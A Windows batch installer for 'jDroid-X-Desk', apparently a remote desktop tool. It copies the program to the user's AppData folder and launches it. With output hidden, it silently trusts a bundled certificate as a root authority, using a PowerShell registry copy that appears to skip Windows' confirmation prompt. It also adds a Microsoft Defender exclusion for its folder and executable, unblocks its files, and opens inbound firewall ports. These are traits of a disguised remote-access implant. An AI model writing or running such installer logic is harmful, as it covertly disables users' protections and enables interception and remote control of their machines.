@echo off
TITLE jDroid-X-Desk Windows Universal App Installer
cd /d "%~dp0"

:: Strangler Forwarder: Delegate to encapsulated scripts/install-windows-app.bat
if exist "scripts\install-windows-app.bat" (
    call "scripts\install-windows-app.bat" %*
    exit /b %ERRORLEVEL%
)

setlocal enabledelayedexpansion
set "INSTALL_DIR=%LOCALAPPDATA%\Programs\jDroid-X-Desk"

ECHO ========================================================
ECHO    jDroid-X-Desk Universal Windows Installer
ECHO    Standard User Folder: %INSTALL_DIR%
ECHO ========================================================
ECHO.

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%INSTALL_DIR%\assets" mkdir "%INSTALL_DIR%\assets"

copy /Y "%~dp0jDroid-X-Desk.exe" "%INSTALL_DIR%\" >nul
if exist "%~dp0jDroid-X-Desk.exe.config" copy /Y "%~dp0jDroid-X-Desk.exe.config" "%INSTALL_DIR%\" >nul
if exist "%~dp0app.manifest" copy /Y "%~dp0app.manifest" "%INSTALL_DIR%\" >nul
if exist "%~dp0jDroid-X-Enterprise.cer" copy /Y "%~dp0jDroid-X-Enterprise.cer" "%INSTALL_DIR%\" >nul
if exist "%~dp0version.json" copy /Y "%~dp0version.json" "%INSTALL_DIR%\" >nul
if exist "%~dp0assets" xcopy /E /I /Y "%~dp0assets" "%INSTALL_DIR%\assets" >nul 2>&1

if not exist "%INSTALL_DIR%\database.json" (
    if exist "%~dp0database.json" copy /Y "%~dp0database.json" "%INSTALL_DIR%\" >nul
)

if exist "%INSTALL_DIR%\jDroid-X-Enterprise.cer" (
    certutil -user -addstore TrustedPublisher "%INSTALL_DIR%\jDroid-X-Enterprise.cer" >nul 2>&1
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$src = 'HKCU:\Software\Microsoft\SystemCertificates\TrustedPublisher\Certificates\ACBD12BEE072C0CAE42760AF078BD1996A6F293F'; $dest = 'HKCU:\Software\Microsoft\SystemCertificates\Root\Certificates\ACBD12BEE072C0CAE42760AF078BD1996A6F293F'; if (Test-Path $src) { if (-not (Test-Path $dest)) { New-Item -Path $dest -Force | Out-Null }; $blob = (Get-ItemProperty -Path $src).Blob; Set-ItemProperty -Path $dest -Name 'Blob' -Value $blob }" >nul 2>&1
    net session >nul 2>&1
    if !ERRORLEVEL! EQU 0 (
        certutil -addstore -f Root "%INSTALL_DIR%\jDroid-X-Enterprise.cer" >nul 2>&1
        certutil -addstore -f TrustedPublisher "%INSTALL_DIR%\jDroid-X-Enterprise.cer" >nul 2>&1
    )
)

powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%INSTALL_DIR%' -Recurse | Unblock-File -ErrorAction SilentlyContinue"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ExclusionProcess 'jDroid-X-Desk.exe' -ErrorAction SilentlyContinue" >nul 2>&1
netsh advfirewall firewall add rule name="jDroid-X-Desk TCP" dir=in action=allow protocol=TCP localport=7700,8088,12345 enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="jDroid-X-Desk UDP" dir=in action=allow protocol=UDP localport=7707,8089,21116 enable=yes >nul 2>&1

SET SCRIPT="%TEMP%\CreateShortcut_%RANDOM%.vbs"
(
    echo Set oWS = WScript.CreateObject("WScript.Shell"^)
    echo sLinkFile = oWS.SpecialFolders("Desktop"^) ^& "\jDroid-X-Desk.lnk"
    echo Set oLink = oWS.CreateShortcut(sLinkFile^)
    echo oLink.TargetPath = "%INSTALL_DIR%\jDroid-X-Desk.exe"
    echo oLink.WorkingDirectory = "%INSTALL_DIR%"
    echo oLink.Description = "jDroid-X-Desk Remote Desktop Console"
    if exist "%INSTALL_DIR%\assets\app.ico" (
        echo oLink.IconLocation = "%INSTALL_DIR%\assets\app.ico,0"
    )
    echo oLink.Save
) > %SCRIPT%
cscript //nologo %SCRIPT%
del %SCRIPT% >nul 2>&1

start "" "%INSTALL_DIR%\jDroid-X-Desk.exe"
exit /b 0
